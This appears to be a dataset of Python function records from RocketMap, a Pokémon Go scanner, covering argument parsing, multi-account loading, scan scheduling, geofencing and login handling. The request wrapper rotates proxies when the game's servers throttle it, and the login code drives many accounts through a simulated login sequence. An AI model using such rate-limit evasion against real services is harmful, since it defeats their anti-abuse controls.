hashing.'),\n                    choices=['bossland', 'devkat'])\nparser.add_argument('--hash-header-sleep',\n                    help=('Use the BossLand headers to determine how long'\n                          ' a worker should sleep if it exceeds the'\n                          ' hashing quota. Default: False.'),\n                    action='store_true', default=False)\nparser.add_argument('-novc', '--no-version-check', action='store_true',\n                    help='Disable API version check.',\n                    default=False)\nparser.add_argument('-vci', '--version-check-interval', type=int,\n                    help='Interval to check API version in seconds ' +\n                    '(Default: in [60, 300]).',\n                    default=random.randint(60, 300))\nparser.add_argument('-odt', '--on-demand_timeout',\n                    help=('Pause searching while web UI is inactive ' +\n                          'for this timeout (in seconds).'),\n                    type=int, default=0)\nparser.add_argument('--disable-blacklist',\n                    help=('Disable the global anti-scraper IP blacklist.'),\n                    action='store_true', default=False)\nparser.add_argument('-tp', '--trusted-proxies', default=[],\n                    action='append',\n                    help=('Enables the use of X-FORWARDED-FOR headers ' +\n                          'to identify the IP of clients connecting ' +\n                          'through these trusted proxies.'))\nparser.add_argument('--api-version', default='0.91.2',\n                    help=('API version currently in use.'))\nparser.add_argument('--no-file-logs',\n                    help=('Disable logging to files. ' +\n                          'Does not disable --access-logs.'),\n                    action='store_true', default=False)\nparser.add_argument('--log-path',\n                    help=('Defines directory to save log files to.'),\n                    default='logs/')\nparser.add_argument('--log-filename',\n                    help=('Defines the log filename to be saved.'\n                          ' Allows date formatting, and replaces <SN>'\n                          \" with the instance's status name. Read the\"\n                          ' python time module docs for details.'\n                          ' Default: %%Y%%m%%d_%%H%%M_<SN>.log.'),\n                    default='%Y%m%d_%H%M_<SN>.log'),\nparser.add_argument('--dump',\n                    help=('Dump censored debug info about the ' +\n                          'environment and auto-upload to ' +\n                          'hastebin.com.'),\n                    action='store_true', default=False)\nparser.add_argument('-exg', '--ex-gyms',\n                    help=('Fetch OSM parks within geofence and flag ' +\n                          'gyms that are candidates for EX raids. ' +\n                          'Only required once per area.'),\n                    action='store_true', default=False)\nverbose = parser.add_mutually_exclusive_group()\nverbose.add_argument('-v',\n                     help=('Show debug messages from RocketMap ' +\n                           'and pgoapi. Can be repeated up to 3 times.'),\n                     action='count', default=0, dest='verbose')\nverbose.add_argument('--verbosity',\n                     help=('Show debug messages from RocketMap ' +\n                           'and pgoapi.'),\n                     type=int, dest='verbose')\nrarity = parser.add_argument_group('Dynamic Rarity')\nrarity.add_argument('-Rh', '--rarity-hours',\n                    help=('Number of hours of Pokemon data to use ' +\n                          'to calculate dynamic rarity. Decimals ' +\n                          'allowed. Default: 48, 0 to use all data.'),\n                    type=float, default=48)\nrarity.add_argument('-Rf', '--rarity-update-frequency',\n                    help=('How often (in minutes) the dynamic rarity ' +\n                          'should be updated. Decimals allowed. ' +\n                          'Default: 0, 0 to disable.'),\n                    type=float, default=0)\nstatusp = parser.add_argument_group('Status Page')\nstatusp.add_argument('-SPp', '--status-page-password', default=None,\n                     help='Set the status page password.')\nstatusp.add_argument('-SPf', '--status-page-filter',\n                     help=('Filter worker status that are inactive for ' +\n                           'X minutes. Default: 30, 0 to disable.'),\n                     type=int, default=30)\nparser.set_defaults(DEBUG=False)\n\nargs = parser.parse_args()\n\n# Allow status name and date formatting in log filename.\nargs.log_filename = strftime(args.log_filename)\nargs.log_filename = args.log_filename.replace('<sn>', '<SN>')\nargs.log_filename = args.log_filename.replace('<SN>', args.status_name)\n\nif args.only_server:\n    if args.location is None:\n        parser.print_usage()\n        print(sys.argv[0] +\n              \": error: arguments -l/--location is required.\")\n        sys.exit(1)\nelse:\n    # If using a CSV file, add the data where needed into the username,\n    # password and auth_service arguments.\n    # CSV file should have lines like \"ptc,username,password\",\n    # \"username,password\" or \"username\".\n    if args.accountcsv is not None:\n        # Giving num_fields something it would usually not get.\n        num_fields = -1\n        with open(args.accountcsv, 'r') as f:\n            for num, line in enumerate(f, 1):\n\n                fields = []\n\n                # First time around populate num_fields with current field\n                # count.\n                if num_fields < 0:\n                    num_fields = line.count(',') + 1\n\n                csv_input = []\n                csv_input.append('')\n                csv_input.append('<username>')\n                csv_input.append('<username>,<password>')\n                csv_input.append('<ptc/google>,<username>,<password>')\n\n                # If the number of fields is different,\n                # then this is not a CSV.\n                if num_fields != line.count(',') + 1:\n                    print(sys.argv[0] +\n                          \": Error parsing CSV file on line \" + str(num) +\n                          \". Your file started with the following \" +\n                          \"input, '\" + csv_input[num_fields] +\n                          \"' but now you gave us '\" +\n                          csv_input[line.count(',') + 1] + \"'.\")\n                    sys.exit(1)\n\n                field_error = ''\n                line = line.strip()\n\n                # Ignore blank lines and comment lines.\n                if len(line) == 0 or line.startswith('#'):\n                    continue\n\n                # If number of fields is more than 1 split the line into\n                # fields and strip them.\n                if num_fields > 1:\n                    fields = line.split(\",\")\n                    fields = map(str.strip, fields)\n\n                # If the number of fields is one then assume this is\n                # \"username\". As requested.\n                if num_fields == 1:\n                    # Empty lines are already ignored.\n                    args.username.append(line)\n\n                # If the number of fields is two then assume this is\n                # \"username,password\". As requested.\n                if num_fields == 2:\n                    # If field length is not longer than 0 something is\n                    # wrong!\n                    if len(fields[0]) > 0:\n                        args.username.append(fields[0])\n                    else:\n                        field_error = 'username'\n\n                    # If field length is not longer than 0 something is\n                    # wrong!\n                    if len(fields[1]) > 0:\n                        args.password.append(fields[1])\n                    else:\n                        field_error = 'password'\n\n                # If the number of fields is three then assume this is\n                # \"ptc,username,password\". As requested.\n                if num_fields >= 3:\n                    # If field 0 is not ptc or google something is wrong!\n                    if (fields[0].lower() == 'ptc' or\n                            fields[0].lower() == 'google'):\n                        args.auth_service.append(fields[0])\n                    else:\n                        field_error = 'method'\n\n                    # If field length is not longer then 0 something is\n                    # wrong!\n                    if len(fields[1]) > 0:\n                        args.username.append(fields[1])\n                    else:\n                        field_error = 'username'\n\n                    # If field length is not longer then 0 something is\n                    # wrong!\n                    if len(fields[2]) > 0:\n                        args.password.append(fields[2])\n                    else:\n                        field_error = 'password'\n\n                # If something is wrong display error.\n                if field_error != '':\n                    type_error = 'empty!'\n                    if field_error == 'method':\n                        type_error = (\n                            'not ptc or google instead we got \\'' +\n                            fields[0] + '\\'!')\n                    print(sys.argv[0] +\n                          \": Error parsing CSV file on line \" + str(num) +\n                          \". We found \" + str(num_fields) + \" fields, \" +\n                          \"so your input should have looked like '\" +\n                          csv_input[num_fields] + \"'\\nBut you gave us '\" +\n                          line + \"', your \" + field_error +\n                          \" was \" + type_error)\n                    sys.exit(1)\n\n    errors = []\n\n    num_auths = len(args.auth_service)\n    num_usernames = 0\n    num_passwords = 0\n\n    if len(args.username) == 0:\n        errors.append(\n            'Missing `username` either as -u/--username, csv file ' +\n            'using -ac, or in config.')\n    else:\n        num_usernames = len(args.username)\n\n    if args.location is None:\n        errors.append(\n            'Missing `location` either as -l/--location or in config.')\n\n    if len(args.password) == 0:\n        errors.append(\n            'Missing `password` either as -p/--password, csv file, ' +\n            'or in config.')\n    else:\n        num_passwords = len(args.password)\n\n    if args.step_limit is None:\n        errors.append(\n            'Missing `step_limit` either as -st/--step-limit or ' +\n            'in config.')\n\n    if num_auths == 0:\n        args.auth_service = ['ptc']\n\n    num_auths = len(args.auth_service)\n\n    if num_usernames > 1:\n        if num_passwords > 1 and num_usernames != num_passwords:\n            errors.append((\n                'The number of provided passwords ({}) must match the ' +\n                'username count ({})').format(num_passwords,\n                                              num_usernames))\n        if num_auths > 1 and num_usernames != num_auths:\n            errors.append((\n                'The number of provided auth ({}) must match the ' +\n                'username count ({}).').format(num_auths, num_usernames))\n\n    if len(errors) > 0:\n        parser.print_usage()\n        print(sys.argv[0] + \": errors: \\n - \" + \"\\n - \".join(errors))\n        sys.exit(1)\n\n    # Fill the pass/auth if set to a single value.\n    if num_passwords == 1:\n        args.password = [args.password[0]] * num_usernames\n    if num_auths == 1:\n        args.auth_service = [args.auth_service[0]] * num_usernames\n\n    # Make the accounts list.\n    args.accounts = []\n    for i, username in enumerate(args.username):\n        args.accounts.append({'username': username,\n                              'password': args.password[i],\n                              'auth_service': args.auth_service[i]})\n\n    # Prepare the L30 accounts for the account sets.\n    args.accounts_L30 = []\n\n    if args.high_lvl_accounts:\n        # Context processor.\n        with open(args.high_lvl_accounts, 'r') as accs:\n            for line in accs:\n                # Make sure it's not an empty line.\n                if not line.strip():\n                    continue\n\n                line = line.split(',')\n\n                # We need \"service, username, password\".\n                if len(line) < 3:\n                    raise Exception('L30 account is missing a'\n                                    + ' field. Each line requires: '\n                                    + '\"service,user,pass\".')\n\n                # Let's remove trailing whitespace.\n                service = line[0].strip()\n                username = line[1].strip()\n                password = line[2].strip()\n\n                hlvl_account = {\n                    'auth_service': service,\n                    'username': username,\n                    'password': password,\n                    'captcha': False\n                }\n\n                args.accounts_L30.append(hlvl_account)\n\n    # Prepare the IV/CP scanning filters.\n    args.enc_whitelist = []\n\n    # IV/CP scanning.\n    if args.enc_whitelist_file:\n        with open(args.enc_whitelist_file) as f:\n            args.enc_whitelist = frozenset([int(l.strip()) for l in f])\n\n    # Make max workers equal number of accounts if unspecified, and disable\n    # account switching.\n    if args.workers is None:\n        args.workers = len(args.accounts)\n        args.account_search_interval = None\n\n    # Disable search interval if 0 specified.\n    if args.account_search_interval == 0:\n        args.account_search_interval = None\n\n    # Make sure we don't have an empty account list after adding command\n    # line and CSV accounts.\n    if len(args.accounts) == 0:\n        print(sys.argv[0] +\n              \": Error: no accounts specified. Use -a, -u, and -p or \" +\n              \"--accountcsv to add accounts.\")\n        sys.exit(1)\n\n    if args.webhook_whitelist_file:\n        with open(args.webhook_whitelist_file) as f:\n            args.webhook_whitelist = frozenset(\n                [int(p_id.strip()) for p_id in f])\n    elif args.webhook_blacklist_file:\n        with open(args.webhook_blacklist_file) as f:\n            args.webhook_blacklist = frozenset(\n                [int(p_id.strip()) for p_id in f])\n    else:\n        args.webhook_blacklist = frozenset(\n            [int(i) for i in args.webhook_blacklist])\n        args.webhook_whitelist = frozenset(\n            [int(i) for i in args.webhook_whitelist])\n\n    # create an empty set\n    args.ignorelist = []\n    if args.ignorelist_file:\n        with open(args.ignorelist_file) as f:\n            args.ignorelist = frozenset([int(l.strip()) for l in f])\n\n    # Decide which scanning mode to use.\n    if args.spawnpoint_scanning:\n        args.scheduler = 'SpawnScan'\n    elif args.skip_empty:\n        args.scheduler = 'HexSearchSpawnpoint'\n    elif args.speed_scan:\n        args.scheduler = 'SpeedScan'\n    else:\n        args.scheduler = 'HexSearch'\n\n    # Disable webhook scheduler updates if webhooks are disabled\n    if args.webhooks is None:\n        args.wh_types = frozenset()\n    else:\n        args.wh_types = frozenset([i for i in args.wh_types])\n\nargs.locales_dir = 'static/dist/locales'\nargs.data_dir = 'static/dist/data'\n\n# Set hashing endpoint. 'bossland' doesn't need to be added here, it's\n# the default in the API.\nlegal_endpoints = {\n    'devkat': 'https://hashing.devkat.org'\n}\n\nhash_service = args.hash_service.lower()\nendpoint = legal_endpoints.get(hash_service, False)\nif endpoint:\n    log.info('Using hash service: %s.', hash_service)\n    HashServer.endpoint = endpoint\n\nreturn args", "path": "RocketMap/pogom/utils.py", "commit_date": "2018-03-22 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# Retry x times on failure.\n", "func_signal": "def call(self, *args, **kwargs):\n", "code": "retries_left = self.retries\n\nwhile retries_left > 0:\n    # If reduce_retries = True, we expect exception_name to be set.\n    reduce_retries = False\n    rotate_proxy = False\n    exception_name = ''\n\n    try:\n        log.debug('Sending wrapped API request.')\n        return self.request.call(*args, **kwargs)\n    except HashingQuotaExceededException:\n        # Default = sleep for a little bit, then retry.\n        random_sleep_secs = random.uniform(0.75, 1.5)\n        secs_to_sleep = random_sleep_secs\n\n        # Sleep until the RPM reset to free some RPM and don't use\n        # one of our retries, just retry until we have RPM left.\n        # If RPM reset was in the past, we'll still sleep for a\n        # little bit to introduce variation.\n        if self.args.hash_header_sleep:\n            now = int(time.time())\n            rpm_reset = HashServer.status.get('period', now)\n            secs_till_reset = rpm_reset - now\n\n            # Could be outdated key header, or already passed.\n            if secs_till_reset > 0:\n                secs_to_sleep = secs_till_reset + random_sleep_secs\n\n        # Don't be too enthusiastic about sleeping. Failsafe against a\n        # bugged header, timezone problems, ...\n        secs_to_sleep = min(secs_to_sleep, 60)\n\n        # Shhhhhh. Only happy dreams now.\n        log.debug('Hashing quota exceeded. If this delays requests for'\n                  ' too long, consider adding more RPM. Sleeping for'\n                  ' %ss before retrying...', secs_to_sleep)\n        time.sleep(secs_to_sleep)\n    except (ServerSideRequestThrottlingException,\n            NianticThrottlingException) as ex:\n        # Raised when too many requests were made in a short period.\n        # Sleep a bit.\n        reduce_retries = True\n        rotate_proxy = True\n        exception_name = type(ex).__name__\n        time.sleep(random.uniform(0.75, 1.5))\n    except (HashingOfflineException, HashingTimeoutException) as ex:\n        # Hashing server issues. Make sure we sleep a minimum.\n        reduce_retries = True\n        rotate_proxy = True\n        exception_name = type(ex).__name__\n        time.sleep(random.uniform(0.75, 1.5))\n    except Exception as ex:\n        reduce_retries = True\n        rotate_proxy = True\n        exception_name = type(ex).__name__\n\n    if reduce_retries and retries_left > 0:\n        plural = 'retries' if retries_left > 1 else 'retry'\n        log.debug('API request failed with exception type %s.'\n                  ' Retrying w/ %s %s left...',\n                  exception_name,\n                  retries_left,\n                  plural)\n        retries_left -= 1\n\n    # Rotate proxy. Not necessary on\n    # HashingQuotaExceededException, because it's proof that\n    # the proxy worked. The variable \"rotate_proxy\" may seem\n    # unnecessary, but it's here for readability and avoiding problems\n    # in the future.\n    if rotate_proxy and self.args.proxy:\n        proxy_idx, proxy_url = get_new_proxy(get_args())\n\n        if proxy_url:\n            log.debug('Changed to proxy: %s.', proxy_url)\n            proxy_config = {\n                'http': proxy_url,\n                'https': proxy_url\n            }\n            parent = self.request.__parent__\n            parent.set_proxy(proxy_config)\n            parent._auth_provider.set_proxy(proxy_config)\n\n# If we've reached here, we have no retries left and an exception\n# still occurred.\nraise", "path": "RocketMap/pogom/pgorequestwrapper.py", "commit_date": "2018-03-22 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# Helper method to log to specific log level.\n", "func_signal": "def log_resource_usage_loop(loop_delay_ms=60000):\n", "code": "def log_resource_usage_to_debug():\n    log_resource_usage(log.debug)\n\nperiodic_loop(log_resource_usage_to_debug, loop_delay_ms)", "path": "RocketMap/pogom/utils.py", "commit_date": "2018-03-22 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# Initialize first coordinate as default.\n", "func_signal": "def is_point_in_polygon_custom(point, polygon):\n", "code": "maxLat = polygon[0]['lat']\nminLat = polygon[0]['lat']\nmaxLon = polygon[0]['lon']\nminLon = polygon[0]['lon']\n\nfor coords in polygon:\n    maxLat = max(coords['lat'], maxLat)\n    minLat = min(coords['lat'], minLat)\n    maxLon = max(coords['lon'], maxLon)\n    minLon = min(coords['lon'], minLon)\n\nif ((point['lat'] > maxLat) or (point['lat'] < minLat) or\n        (point['lon'] > maxLon) or (point['lon'] < minLon)):\n    return False\n\ninside = False\nlat1, lon1 = polygon[0]['lat'], polygon[0]['lon']\nN = len(polygon)\nfor n in range(1, N+1):\n    lat2, lon2 = polygon[n % N]['lat'], polygon[n % N]['lon']\n    if (min(lon1, lon2) < point['lon'] <= max(lon1, lon2) and\n            point['lat'] <= max(lat1, lat2)):\n                if lon1 != lon2:\n                    latIntersection = (\n                        (point['lon'] - lon1) *\n                        (lat2 - lat1) / (lon2 - lon1) +\n                        lat1)\n\n                if lat1 == lat2 or point['lat'] <= latIntersection:\n                    inside = not inside\n\n    lat1, lon1 = lat2, lon2\n\nreturn inside", "path": "RocketMap/pogom/geofence.py", "commit_date": "2017-07-22 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "\"\"\"Retrieve forced API version by Niantic\n\nArgs:\n    args: Command line arguments\n\nReturns:\n    API version string. False if request failed.\n\"\"\"\n", "func_signal": "def get_api_version(args):\n", "code": "proxies = {}\n\nif args.proxy:\n    num, proxy = get_new_proxy(args)\n    proxies = {\n        'http': proxy,\n        'https': proxy\n    }\n\ntry:\n    s = requests.Session()\n    s.mount('https://',\n            HTTPAdapter(max_retries=Retry(total=3,\n                                          backoff_factor=0.5,\n                                          status_forcelist=[500, 502,\n                                                            503, 504])))\n    r = s.get(\n        'https://pgorelease.nianticlabs.com/plfe/version',\n        proxies=proxies,\n        verify=False,\n        timeout=5)\n\n    return r.text[2:] if r.status_code == requests.codes.ok else False\nexcept Exception as e:\n    log.warning('error on API check: %s', repr(e))\n    return False", "path": "RocketMap/pogom/search.py", "commit_date": "2018-03-04 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# Thread safety: don't let multiple threads get the same \"best item\".\n", "func_signal": "def next_item(self, status):\n", "code": "with self.lock_next_item:\n    # Score each item in the queue by # of due spawns or scan time\n    # bands can be filled.\n\n    while not self.ready:\n        time.sleep(1)\n\n    now_date = datetime.utcnow()\n    q = self.queues[0]\n    ms = ((now_date - self.refresh_date).total_seconds() +\n          self.refresh_ms)\n    best = {}\n    if not status['latitude']:\n        worker_loc = None\n    else:\n        worker_loc = [status['latitude'], status['longitude']]\n    last_action = status['last_scan_date']\n\n    # Logging.\n    log.debug('Enumerating %s scan locations in queue.',\n              len(q))\n\n    # Keep some stats for logging purposes. If something goes wrong,\n    # we can track what happened.\n    count_claimed = 0\n    count_parked = 0\n    count_missed = 0\n    count_fresh_band = 0\n    count_early = 0\n    count_late = 0\n    min_parked_time_remaining = 0\n    min_fresh_band_time_remaining = 0\n\n    # Check all scan locations possible in the queue.\n    for i, item in enumerate(q):\n        # If already claimed by another worker or done, pass.\n        if item.get('done', False):\n            count_claimed += 1\n            continue\n\n        # If the item is parked by a different thread (or by a\n        # different account, which should be on that one thread),\n        # pass.\n        our_parked_name = status['username']\n        if 'parked_name' in item:\n            # We use 'parked_last_update' to determine when the\n            # last time was since the thread passed the item with the\n            # same thread name & username. If it's been too long, unset\n            # the park so another worker can pick it up.\n            now = default_timer()\n            max_parking_idle_seconds = 3 * 60\n            time_passed = now - item.get('parked_last_update', now)\n            time_remaining = (max_parking_idle_seconds - time_passed)\n\n            # Update logging stats.\n            if not min_parked_time_remaining:\n                min_parked_time_remaining = time_remaining\n            elif time_remaining < min_parked_time_remaining:\n                min_parked_time_remaining = time_remaining\n\n            # Check parked status.\n            if (time_passed > max_parking_idle_seconds):\n                # Unpark & don't skip it.\n                item.pop('parked_name', None)\n                item.pop('parked_last_update', None)\n            else:\n                # Still parked and not our item. Skip it.\n                if item.get('parked_name') != our_parked_name:\n                    count_parked += 1\n                    continue\n\n        # If already timed out, mark it as Missed and check next.\n        if ms > item['end']:\n            count_missed += 1\n            item['done'] = 'Missed' if not item.get(\n                'done', False) else item['done']\n            continue\n\n        # If we just did a fresh band recently, wait a few seconds to\n        # space out the band scans.\n        if now_date < self.next_band_date:\n            count_fresh_band += 1\n\n            # Update logging stats.\n            band_time_remaining = (self.next_band_date - now_date)\n            if not min_fresh_band_time_remaining:\n                min_fresh_band_time_remaining = band_time_remaining\n            elif band_time_remaining < min_fresh_band_time_remaining:\n                min_fresh_band_time_remaining = band_time_remaining\n\n            continue\n\n        # If we are going to get there before it starts then ignore.\n        loc = item['loc']\n        if worker_loc and self.args.kph > 0:\n            meters = distance(loc, worker_loc)\n            secs_to_arrival = meters / self.args.kph * 3.6\n            secs_waited = (now_date - last_action).total_seconds()\n            secs_to_arrival = max(secs_to_arrival - secs_waited, 0)\n        else:\n            meters = 0\n            secs_to_arrival = 0\n\n        if ms + secs_to_arrival < item['start']:\n            count_early += 1\n            continue\n\n        # If we can't make it there before it disappears, don't bother\n        # trying.\n        if ms + secs_to_arrival > item['end']:\n            count_late += 1\n            continue\n\n        # Bands are top priority to find new spawns first\n        score = 1e12 if item['kind'] == 'band' else (\n            1e6 if item['kind'] == 'TTH' else 1)\n\n        # For spawns, score is purely based on how close they are to\n        # last worker position\n        score = score / (meters + 10.0)\n\n        if score > best.get('score', 0):\n            best = {'score': score, 'i': i,\n                    'secs_to_arrival': secs_to_arrival}\n            best.update(item)\n\n    # If we didn't find one, log it.\n    if not best:\n        log.debug('Enumerating queue found no best location, with'\n                  + ' %s claimed, %s parked, %s missed, %s fresh band'\n                  + \" skips, %s missed because we're early, %s because\"\n                  + \" we're too late. Minimum %s time remaining on\"\n                  + ' parked item, and %s time remaining for next'\n                  + ' fresh band.',\n                  count_claimed,\n                  count_parked,\n                  count_missed,\n                  count_fresh_band,\n                  count_early,\n                  count_late,\n                  min_parked_time_remaining,\n                  min_fresh_band_time_remaining)\n    else:\n        log.debug('Enumerating queue found best location: %s.', best)\n\n    loc = best.get('loc', [])\n    step = best.get('step', 0)\n    secs_to_arrival = best.get('secs_to_arrival', 0)\n    i = best.get('i', 0)\n    st = best.get('start', 0)\n    end = best.get('end', 0)\n\n    log.debug('step {} start {} end {} secs to arrival {}'.format(\n        step, st, end, secs_to_arrival))\n\n    messages = {\n        'wait': 'Nothing to scan.',\n        'early': 'Early for step {}; waiting a few seconds...'.format(\n            step),\n        'late': ('API response on step {} delayed by {} seconds. ' +\n                 'Possible causes: slow proxies, internet, or ' +\n                 'Niantic servers.').format(\n                     step,\n                     int((now_date - last_action).total_seconds())),\n        'search': 'Searching at step {}.'.format(step),\n        'invalid': ('Invalid response at step {}, abandoning ' +\n                    'location.').format(step)\n    }\n    try:\n        item = q[i]\n    except IndexError:\n        messages['wait'] = ('Search aborting.'\n                            + ' Overseer refreshing queue.')\n        return -1, 0, 0, 0, messages, 0\n\n    if best.get('score', 0) == 0:\n        if count_late > 0:\n            messages['wait'] = ('Not able to reach any scan'\n                                + ' under the speed limit.')\n        return -1, 0, 0, 0, messages, 0\n\n    meters = distance(loc, worker_loc) if worker_loc else 0\n    if self.args.kph > 0 and (meters >\n                              (now_date - last_action).total_seconds()\n                              * self.args.kph / 3.6):\n        # Flag item as \"parked\" by a specific thread, because\n        # we're waiting for it. This will avoid all threads \"walking\"\n        # to the same item.\n        our_parked_name = status['username']\n        item['parked_name'] = our_parked_name\n\n        # CTRL+F 'parked_last_update' in this file for more info.\n        item['parked_last_update'] = default_timer()\n\n        messages['wait'] = 'Moving {}m to step {} for a {}.'.format(\n            int(meters), step, best['kind'])\n        # So we wait while the worker arrives at the destination\n        # But we don't want to sleep too long or the item might get\n        # taken by another worker\n        if secs_to_arrival > 179 - self.args.scan_delay:\n            secs_to_arrival = 179 - self.args.scan_delay\n        return -1, 0, 0, 0, messages, max(secs_to_arrival, 0)\n\n    # Check again if another worker heading there.\n    # TODO: Check if this is still necessary. I believe this was\n    # originally a failed attempt at thread safety, which still\n    # resulted in a race condition (multiple workers heading to the\n    # same spot). A thread Lock has since been added.\n    if item.get('done', False):\n        messages['wait'] = ('Skipping step {}. Other worker already ' +\n                            'scanned.').format(step)\n        return -1, 0, 0, 0, messages, 0\n\n    if not self.ready:\n        messages['wait'] = ('Search aborting.'\n                            + ' Overseer refreshing queue.')\n        return -1, 0, 0, 0, messages, 0\n\n    # If a new band, set the date to wait until for the next band.\n    if best['kind'] == 'band' and best['end'] - best['start'] > 5 * 60:\n        self.next_band_date = datetime.utcnow() + timedelta(\n            seconds=self.band_spacing)\n\n    # Mark scanned\n    item['done'] = 'Scanned'\n    status['index_of_queue_item'] = i\n    status['queue_version'] = self.queue_version\n\n    messages['search'] = 'Scanning step {} for a {}.'.format(\n        best['step'], best['kind'])\n    return best['step'], best['loc'], 0, 0, messages, 0", "path": "RocketMap/pogom/schedulers.py", "commit_date": "2018-03-05 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# We're on a 60-second timer.\n", "func_signal": "def dynamic_loading_refresher(file_list):\n", "code": "refresh_time_sec = 60\n\nwhile True:\n    # Wait (x-1) seconds before refresh, min. 1s.\n    time.sleep(max(1, refresh_time_sec - 1))\n\n    for arg_type, filename in file_list.items():\n        try:\n            # IV/CP scanning.\n            if filename:\n                # Only refresh if the file has changed.\n                current_time_sec = time.time()\n                file_modified_time_sec = os.path.getmtime(filename)\n                time_diff_sec = current_time_sec - file_modified_time_sec\n\n                # File has changed in the last refresh_time_sec seconds.\n                if time_diff_sec < refresh_time_sec:\n                    args = get_args()\n                    with open(filename) as f:\n                        new_list = frozenset([int(l.strip()) for l in f])\n                        setattr(args, arg_type, new_list)\n                        log.info('New %s is: %s.', arg_type, new_list)\n                else:\n                    log.debug('No change found in %s.', filename)\n        except Exception as e:\n            log.exception('Exception occurred while' +\n                          ' updating %s: %s.', arg_type, e)", "path": "RocketMap/pogom/utils.py", "commit_date": "2018-03-22 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# Logged in? Enough time left? Cool!\n", "func_signal": "def check_login(args, account, api, proxy_url):\n", "code": "if api._auth_provider and api._auth_provider._access_token:\n    remaining_time = api._auth_provider._access_token_expiry - time.time()\n\n    if remaining_time > 60:\n        log.debug(\n            'Credentials remain valid for another %f seconds.',\n            remaining_time)\n        return\n\n# Try to login. Repeat a few times, but don't get stuck here.\nnum_tries = 0\n\n# One initial try + login_retries.\nwhile num_tries < (args.login_retries + 1):\n    try:\n        if proxy_url:\n            api.set_authentication(\n                provider=account['auth_service'],\n                username=account['username'],\n                password=account['password'],\n                proxy_config={'http': proxy_url, 'https': proxy_url})\n        else:\n            api.set_authentication(\n                provider=account['auth_service'],\n                username=account['username'],\n                password=account['password'])\n        # Success!\n        break\n    except AuthException:\n        num_tries += 1\n        log.error(\n            ('Failed to login to Pokemon Go with account %s. ' +\n             'Trying again in %g seconds.'),\n            account['username'], args.login_delay)\n        time.sleep(args.login_delay)\n\nif num_tries > args.login_retries:\n    log.error(\n        ('Failed to login to Pokemon Go with account %s in ' +\n         '%d tries. Giving up.'),\n        account['username'], num_tries)\n    raise TooManyLoginAttempts('Exceeded login attempts.')\n\ntime.sleep(random.uniform(2, 4))\n\n# Simulate login sequence.\nrpc_login_sequence(args, api, account)", "path": "RocketMap/pogom/account.py", "commit_date": "2018-03-07 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# No locations yet? Try the database!\n", "func_signal": "def _generate_locations(self):\n", "code": "if not self.locations and not self.args.no_pokemon:\n    log.debug('Loading spawn points from database.')\n\n    spawns = SpawnPoint.select_in_hex_by_location(\n        self.scan_location, self.step_limit)\n\n    log.debug('Loaded %s spawn points from database.' % len(spawns))\n\n    for sp in spawns:\n        time, disappear_time = SpawnPoint.start_end(sp)\n\n        if time > cur_sec():\n            # Hasn't spawn in the current hour.\n            from_now = time - cur_sec()\n            appears = now() + from_now\n        else:\n            # Won't spawn until next hour.\n            late_by = cur_sec() - time\n            appears = now() + 3600 - late_by\n\n        duration = (disappear_time - time) % 3600\n        leaves = appears + duration\n\n        self.locations.append({\n            'spawnpoint_id': sp['id'],\n            'lat': sp['latitude'],\n            'lng': sp['longitude'],\n            'time': time,\n            'appears': appears,\n            'leaves': leaves\n        })\n\n# Geofence spawnpoints.\nif self.geofences.is_enabled():\n    self.locations = self.geofences.get_geofenced_coordinates(\n        self.locations)\n    if not self.locations:\n        log.error('No cells regarded as valid for desired scan area. '\n                  'Check your provided geofences. Aborting.')\n        os._exit(1)\n\n# Well shit...\nif not self.locations:\n    raise Exception('No available spawn points!')\n\nlog.info('Tracking a total of %d spawn points.', len(self.locations))\n\n# Cluster spawnpoints.\nif self.args.ss_cluster_time > 0:\n    self.locations = cluster_spawnpoints(\n        self.locations, self.cluster_range, self.args.ss_cluster_time)\n    log.info('Compressed spawn points into %d clusters.',\n             len(self.locations))\n\n# Put the spawn points in order of next appearance time.\nself.locations.sort(key=itemgetter('appears'))\n\n# Match expected structure:\n# locations = [((lat, lng, alt), ts_appears, ts_leaves),...]\nretset = []\nfor step, sp in enumerate(self.locations, 1):\n    altitude = get_altitude(self.args, [sp['lat'], sp['lng']])\n    retset.append((step, (sp['lat'], sp['lng'], altitude),\n                   sp['appears'], sp['leaves']))\n\nreturn retset", "path": "RocketMap/pogom/schedulers.py", "commit_date": "2018-03-05 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# Prepare hashing keys to be sent to the database.\n# Keep highest peak value stored.\n", "func_signal": "def upsertKeys(keys, key_scheduler, db_updates_queue):\n", "code": "hashkeys = {}\nstored_peaks = HashKeys.get_stored_peaks()\nfor key, instance in key_scheduler.keys.iteritems():\n    hashkeys[key] = instance\n    hashkeys[key]['key'] = key\n\n    if key in stored_peaks:\n        max_peak = max(instance['peak'], stored_peaks[key])\n        hashkeys[key]['peak'] = max_peak\n\ndb_updates_queue.put((HashKeys, hashkeys))", "path": "RocketMap/pogom/search.py", "commit_date": "2018-03-04 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
